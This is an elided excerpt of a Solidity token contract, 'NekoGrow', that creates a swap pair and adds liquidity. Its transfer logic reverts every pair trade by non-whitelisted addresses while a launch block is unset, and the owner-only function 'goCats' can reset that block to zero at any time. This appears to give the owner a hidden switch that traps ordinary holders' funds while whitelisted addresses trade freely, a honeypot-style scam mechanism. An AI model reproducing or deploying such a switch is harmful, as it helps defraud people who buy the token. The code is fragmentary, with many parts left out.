...
contract NekoGrow is IERC20, Ownable {
    ...
    uint256 public _itsNekogrowBlock;
    ...
    constructor (
        address RouterAddress, address catsddressAddress,
        ...
        IERC20(catsddressAddress).approve(address(swapRouter), MAX);

        _cats = catsddressAddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), catsddressAddress);
        _mainPair = swapPair;
        ...
        _tokenDistributor = new TokenDistributor(catsddressAddress);
    }
    ...
    function _transfer(
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_whitelist[from] && !_whitelist[to]) {
                if (0 == _itsNekogrowBlock) {
                    require(false);
                }
                if (block.number < _itsNekogrowBlock + set && !_swapPairList[from]) {
        ...
        if (lpAmount > 0) {
            ...
            if (lpL > 0) {
                _swapRouter.addLiquidity(
                    address(this), _cats, lpAmount, lpL, 0, 0, fundAddress, block.timestamp
                );
            }
        }
    }
    ...
    function _itsNekogrow() external onlyOwner {
        _itsNekogrowBlock = block.number;
    }

    function goCats() external onlyOwner {
        _itsNekogrowBlock = 0;
    }
    ...
    function multi_multialleyCats(address[] calldata addresses, bool value) public onlyOwner{
